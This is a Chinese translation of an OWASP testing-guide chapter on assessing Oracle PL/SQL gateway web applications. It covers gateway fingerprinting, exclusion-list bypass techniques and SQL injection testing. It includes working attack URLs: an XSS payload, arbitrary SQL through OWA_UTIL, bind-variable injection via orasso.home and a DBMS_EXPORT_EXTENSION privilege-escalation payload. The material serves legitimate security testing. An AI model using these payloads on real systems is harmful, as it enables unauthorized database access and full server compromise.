# Oracle数据库测试

## 概述

基于 Web 的 PL/SQL 应用程序通过 PL/SQL 网关启用，该组件负责将 Web 请求转换为数据库查询。Oracle 开发了多种软件实现，从早期的 Web 监听器产品到 Apache `mod_plsql` 模块，再到 XML 数据库（XDB）Web 服务器。这些实现各有其特性与问题，本章将逐一深入探讨。使用 PL/SQL 网关的产品包括但不限于 Oracle HTTP Server、电子商务套件（eBusiness Suite）、Portal、HTMLDB、WebDB 和 Oracle Application Server。

## 测试方法

### PL/SQL 网关工作原理

本质上，PL/SQL 网关仅充当代理服务器，接收用户的 Web 请求并将其传递至数据库服务器执行。

1.  Web 服务器接收来自 Web 客户端的请求，并判断是否应由 PL/SQL 网关处理。
2.  PL/SQL 网关通过提取请求的包名、过程及变量来处理该请求。
3.  请求的包和过程被包装在一个匿名 PL/SQL 代码块中，并发送至数据库服务器。
4.  数据库服务器执行该过程，并将结果以 HTML 格式返回给网关。
5.  网关通过 Web 服务器将响应返回给客户端。

理解这一点至关重要——PL/SQL代码并非存在于Web服务器上，而是位于数据库服务器中。这意味着，一旦PL/SQL网关或PL/SQL应用程序中的漏洞被利用，攻击者将直接获取数据库服务器的访问权限；任何防火墙都无法阻止此类攻击。

PL/SQL网络应用程序的URL通常易于识别，一般以以下形式开头（xyz可为任意字符串，代表数据库访问描述符）：

- `https://www.example.com/pls/xyz`
- `https://www.example.com/xyz/owa`
- `https://www.example.com/xyz/plsql`

其中第二、三种示例是旧版PL/SQL网关的URL格式，第一种则为基于Apache的较新版本所用。在Apache的plsql.conf配置文件中，默认将`/pls`路径设置为由PLS模块作为处理器的Location节点。但该路径不一定必须是`/pls`。URL中若缺少文件扩展名，可能暗示存在Oracle PL/SQL网关。例如以下URL：

`https://www.server.com/aaa/bbb/xxxxx.yyyyy`

若 `xxxxx.yyyyy` 被替换为类似 `ebank.home`、`store.welcome`、`auth.login` 或 `books.search` 的命名形式，则存在较大可能正在使用 PL/SQL 网关。此外，可在请求的包和过程名前附加其所属用户（即模式）名称，例如用户为 `webuser` 时：

`https://www.server.com/pls/xyz/webuser.pkg.proc`

此 URL 中的 xyz 为数据库访问描述符（DAD）。DAD 用于定义数据库服务器的连接信息，使 PL/SQL 网关能够建立连接，包含 TNS 连接字符串、用户 ID 与密码、认证方式等内容。在较新版本中，这些 DAD 配置存储于 Apache 的 `dads.conf` 配置文件，旧版本则记录在 `wdbsvr.app` 文件中。部分默认 DAD 示例如下：

```txt
SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO
TEST
DAD
APP
ONLINE
DB
OWA
```

#### 判断PL/SQL网关是否运行

在对服务器进行安全评估时，首先需要明确目标所使用的技术栈。例如在黑盒测试场景下，若初始信息未知，则需先进行技术识别。识别基于Web的PL/SQL应用程序较为简单：除了上文讨论的URL格式特征外，还可通过一系列简单测试验证PL/SQL网关的存在。

#### 服务器响应头分析

Web服务器的响应头是判断是否运行PL/SQL网关的重要指标。下表列出部分典型服务器响应头示例：

```text
Oracle-Application-Server-10g
Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server
Oracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server
Oracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)
Oracle-Application-Server-10g/9.0.4.0.0
Oracle HTTP Server Powered by Apache
Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a
Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d
Oracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e
Oracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e
Oracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c
Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b
Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0
Oracle_Web_Listener/4.0.7.1.0EnterpriseEdition
Oracle_Web_Listener/4.0.8.2EnterpriseEdition
Oracle_Web_Listener/4.0.8.1.0EnterpriseEdition
Oracle_Web_listener3.0.2.0.0/2.14FC1
Oracle9iAS/9.0.2 Oracle HTTP Server
Oracle9iAS/9.0.3.1 Oracle HTTP Server
```

#### NULL测试

在PL/SQL中，`null`是一个完全有效的表达式：

```sql
SQL> BEGIN
  NULL;
  END;
  /
PL/SQL procedure successfully completed.
```

我们可以利用此特性测试服务器是否运行PL/SQL网关。只需在`DAD`后依次附加`NULL`和`NOSUCHPROC`进行访问：

- `https://www.example.com/pls/dad/null`
- `https://www.example.com/pls/dad/nosuchproc`

若服务器对第一个URL返回`200 OK`响应，对第二个URL返回`404 Not Found`，则表明该服务器正在运行PL/SQL网关。

#### 已知包访问

在旧版PL/SQL网关中，可直接访问构成PL/SQL Web工具包（如OWA和HTP包）的包。其中`OWA_UTIL`包（后续将详细讨论）包含名为SIGNATURE的过程，该过程会以HTML格式输出PL/SQL签名。因此访问

`https://www.example.com/pls/dad/owa_util.signature`

会在网页返回以下输出：

`"This page was produced by the PL/SQL Web Toolkit on date"`
或
`"This page was produced by the PL/SQL Cartridge on date"`

若未获得上述响应而返回403禁止访问响应，则可推断PL/SQL网关正在运行。此响应常见于新版或已修复的系统中。

#### 访问数据库中的任意PL/SQL包

攻击者可利用数据库服务器中默认安装的PL/SQL程序包存在的安全漏洞。具体利用方式取决于PL/SQL网关的版本。在早期版本中，攻击者能够直接访问数据库服务器中的任意PL/SQL程序包。此前提到的`OWA_UTIL`包可被用于执行任意SQL查询：

`https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT?P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS`

通过HTP包可发起跨站脚本攻击：

`https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>`

鉴于明显的安全风险，Oracle引入了PLSQL排除列表机制，禁止直接访问此类危险过程。被禁止的请求包括：以`SYS.*`开头的所有请求、以`DBMS_*`开头的请求、包含`HTP.*`或`OWA*`的请求。但该排除列表仍可被绕过，且未限制对`CTXSYS`、`MDSYS`等模式中程序包的访问，因此可能利用这些程序包中的漏洞：

`https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL`

若数据库服务器仍存在此漏洞（CVE-2006-0265），上述请求将返回空白HTML页面并伴随200 OK响应。

### 测试PL/SQL网关的漏洞

多年来，Oracle PL/SQL网关存在诸多安全缺陷，包括可访问管理页面（CVE-2002-0561）、缓冲区溢出（CVE-2002-0559）、目录遍历漏洞，以及允许攻击者绕过排除列表进而访问并执行数据库服务器中任意PL/SQL程序包的漏洞。

### 绕过PL/SQL排除列表

Oracle多次尝试修复允许攻击者绕过排除列表的漏洞，但每次发布的补丁均被新的绕过技术攻破，这一现象出现的频次令人难以置信。[相关历史记录](https://seclists.org/fulldisclosure/2006/Feb/11)

### 绕过排除列表——方法一

当Oracle首次引入PL/SQL排除列表以阻止攻击者访问任意PL/SQL程序包时，通过在模式名/程序包名前添加十六进制编码的换行符、空格或制表符即可轻易绕过该机制：

```txt
https://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
https://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
https://www.example.com/pls/dad/%09SYS.PACKAGE.PROC
```

### 绕过排除列表——方法二

后期版本的网关中，攻击者可通过在模式名/程序包名前添加标签来绕过排除列表。在PL/SQL中，标签指向可使用GOTO语句跳转的代码行，格式为：`<<NAME>>`

- `https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC`

### 绕过排除列表——方法三

仅需将模式名/程序包名置于双引号内即可实现绕过。注意此方法在Oracle Application Server 10g中无效，因其会将用户请求转换为小写后再发送至数据库服务器，而引号字面值区分大小写——故`SYS`与`sys`被视为不同对象，对后者的请求将返回404未找到错误。但在早期版本中以下方式可生效：

`https://www.example.com/pls/dad/"SYS".PACKAGE.PROC`

### 绕过排除列表——方法四

根据Web服务器与数据库服务器采用的字符集，部分字符会进行转译。例如在某些字符集配置下，字符`ÿ`（`0xFF`）可能在数据库端被转换为`Y`。另一常见转换是长音符号`0xAF`被转为大写`Y`，此类特性可被用于绕过检测：

`https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC`
`https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC`

### 绕过排除列表——方法五

某些版本的PL/SQL网关允许通过反斜杠（`0x5C`）绕过排除列表检测：

`https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC`

### 绕过排除列表——方法六

此为最复杂的排除列表绕过方法，也是最新被修补的技术。若我们请求以下地址：

`https://www.example.com/pls/dad/foo.bar?xyz=123`

应用服务器将在数据库端执行以下操作：

```sql
declare
 rc__ number;
 start_time__ binary_integer;
 simple_list__ owa_util.vc_arr;
 complex_list__ owa_util.vc_arr;
begin
 start_time__ := dbms_utility.get_time;
 owa.init_cgi_env(:n__,:nm__,:v__);
 htp.HTBUF_LEN := 255;
 null;
 null;
 simple_list__(1) := 'sys.%';
 simple_list__(2) := 'dbms\_%';
 simple_list__(3) := 'utl\_%';
 simple_list__(4) := 'owa\_%';
 simple_list__(5) := 'owa.%';
 simple_list__(6) := 'htp.%';
 simple_list__(7) := 'htf.%';
 if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
  rc__ := 2;
 else
  null;
  orasso.wpg_session.init();
  foo.bar(XYZ=>:XYZ);
  if (wpg_docload.is_file_download) then
   rc__ := 1;
   wpg_docload.get_download_file(:doc_info);
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
  else
   rc__ := 0;
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
   owa.get_page(:data__,:ndata__);
  end if;
 end if;
 :rc__ := rc__;
 :db_proc_time__ := dbms_utility.get_time—start_time__;
end;
```

注意第19行与第24行。第19行会将用户请求与已知的“恶意”字符串列表（即排除列表）进行比对。若请求的程序包和过程未包含恶意字符串，则第24行将执行该过程。XYZ参数以绑定变量形式传递。

若我们请求以下地址：

`https://server.example.com/pls/dad/INJECT'POINT`

将执行如下PL/SQL代码：

```sql
..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 inject'point;
..
```

这将在错误日志中生成报错信息："PLS-00103: 期待下列符号之一时遇到符号‘POINT’..."。此处展示的是一种注入任意SQL的途径，可被用于绕过排除列表。攻击者首先需要找到一个无需参数且不匹配排除列表内容的PL/SQL过程。满足此条件的默认程序包数量众多，例如：

```txt
JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO
```

攻击者应选取目标系统上实际可用的函数（即请求时返回`200 OK`）。作为测试，攻击者可请求：

`https://server.example.com/pls/dad/orasso.home?FOO=BAR`

由于orasso.home过程不需要参数但此处已提供参数，服务器应返回`404 文件未找到`响应。但在返回404之前，系统将执行以下PL/SQL代码：

```sql
..
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 orasso.home(FOO=>:FOO);
..
..
```

注意攻击者查询字符串中存在的FOO参数。攻击者可滥用此特性执行任意SQL。首先需要闭合括号：

`https://server.example.com/pls/dad/orasso.home?);--=BAR`

这将导致执行以下PL/SQL代码：

```sql
..
orasso.home();--=>:);--);
..
```

请注意双破折号（`--`）后的所有内容均被视为注释。此请求将引发内部服务器错误，因为其中一个绑定变量不再被使用，因此攻击者需要将其重新添加。实际上，正是该绑定变量成为执行任意PL/SQL的关键。此时，攻击者可先使用`HTP.PRINT`输出BAR值，并通过`:1`添加所需绑定变量：

`https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR`

<!-- s -->
绑定变量为SQL语句的占位符
`:1` 即位置绑定变量，1为第一个参数
此处对应 `BAR`
`HTP.PRINT` 输出HTTP响应内容，于是 HTML 显示 `BAR`
<!-- e -->
此操作应返回状态码`200`并在HTML中显示"BAR"。此处原理是：等号后的内容（本例中为BAR）会作为数据插入绑定变量。利用相同技术可重新获取`owa_util.cellsprint`的访问权限：

`https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS`

要执行任意SQL（包括DML和DDL语句），攻击者需插入`execute immediate :1`：

`https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual`

注意执行结果不会直接显示。该漏洞可被利用来攻击SYS用户拥有的PL/SQL注入漏洞，从而使攻击者完全控制后端数据库服务器。例如以下URL利用了`DBMS_EXPORT_EXTENSION`中的SQL注入漏洞：

```txt
https://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;
```

### 评估自定义PL/SQL Web应用程序

在黑盒安全评估过程中，虽然无法获取自定义PL/SQL应用程序的源代码，但仍需对其安全漏洞进行评估。

#### SQL注入测试

应对每个输入参数进行SQL注入漏洞检测。这类漏洞易于发现和验证：仅需在参数中嵌入单引号并检查错误响应（包括404未找到错误）即可初步识别。确认SQL注入存在可通过拼接操作符实现。

例如，假设某书店PL/SQL Web应用程序支持按作者检索图书：

`https://www.example.com/pls/bookstore/books.search?author=DICKENS`

若该请求返回查尔斯·狄更斯的著作，而

`https://www.example.com/pls/bookstore/books.search?author=DICK'ENS`

返回错误或`404`响应，则可能存在SQL注入漏洞。通过拼接操作符可进一步验证：

`https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS`

若此请求成功返回狄更斯著作列表，则证实存在SQL注入漏洞。

## Tools

- [Orascan (Oracle Web Application VA scanner), NGS SQuirreL (Oracle RDBMS VA Scanner)](https://www.nccgroup.trust/globalassets/service-pages/documents/security-consulting/information-security-software/ncc-squirrel-suite.pdf)

## References

- [WSTG-INPV-05-01](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#bypassing-the-exclusion-list---method-6)

### Whitepapers

- [Hackproofing Oracle Application Server (A Guide to Securing Oracle 9)](https://www.blackhat.com/presentations/win-usa-02/litchfield-winsec02.pdf)
- [Oracle PL/SQL Injection](https://www.oracle.com/technetwork/database/features/plsql/overview/how-to-write-injection-proof-plsql-1-129572.pdf)